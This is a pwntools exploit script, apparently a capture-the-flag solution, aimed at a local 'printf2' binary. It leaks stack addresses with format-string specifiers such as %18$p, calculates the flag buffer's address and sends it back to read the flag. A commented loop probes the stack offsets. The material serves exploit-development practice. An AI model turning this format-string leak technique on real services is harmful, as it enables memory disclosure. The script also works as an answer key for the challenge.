#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4002 --libc ../../libc.so.6 ../src/printf2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../src/printf2')
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 4002)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('../../libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('../../libc.so.6')
else:
    libc = ELF('../../libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *vuln+229
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

# finding flag
#vars = []
#for i in range(1, 40):
#    io = start()
#
#    io.recvuntil(b"time: ")
#    io.sendline(f"%{i}$p".encode('ascii'))
#    data = io.recvuntil(b"Where", drop=True).decode('ascii')
#
#    io.info(f"{i}th stack var: {data}")
#    io.close()

# -- exploit --
io = start()

io.recvuntil(b"time: ")
io.sendline(b"%14$p" if args.LOCAL else b"%18$p")
io.recvuntil(b"said: ")
flag_buffer = int(io.recvuntil(b"Where", drop=True).decode('ascii'), 16) - 28

io.recvuntil(b"from? ")
io.sendline(f"{flag_buffer}".encode('ascii'))
io.recvuntil(b"interesting: ")
flag = io.recvall()
if not flag:
    exit(1)
flag = flag.decode('ascii')

io.success(f"Flag is: {flag}")

